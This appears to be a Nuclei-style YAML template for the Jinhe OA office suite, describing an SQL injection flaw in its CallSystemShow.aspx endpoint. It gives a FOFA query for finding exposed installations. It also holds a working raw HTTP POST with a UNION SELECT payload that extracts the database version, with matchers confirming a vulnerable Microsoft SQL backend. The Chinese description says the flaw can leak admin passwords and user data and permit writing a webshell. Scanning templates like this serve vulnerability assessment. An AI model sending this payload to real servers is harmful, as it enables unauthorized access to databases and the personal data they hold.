id: jinheOA-CallSystemShow_aspx-sql

info:
  tags: jinheOA-CallSystemShow_aspx-sql
  name: 金和OA CallSystemShow.aspx SQL注入漏洞
  author: xc
  severity: high
  description: |-
    fofa: app="金和网络-金和OA" || body="/jc6/platform/sys/login"
    金和OA CallSystemShow.aspx 接口存在SQL注入漏洞，攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码,站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。
http:
  - raw:
      - |
        POST /c6/JHBase.Web.Menu/CallSystemShow.aspx/ HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        MessageID=%27+UNION+ALL+SELECT+NULL%2CNULL%2C%40%40VERSION%2CNULL--
    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - 'Microsoft SQL'
      - type: status
        status: 
          - 200
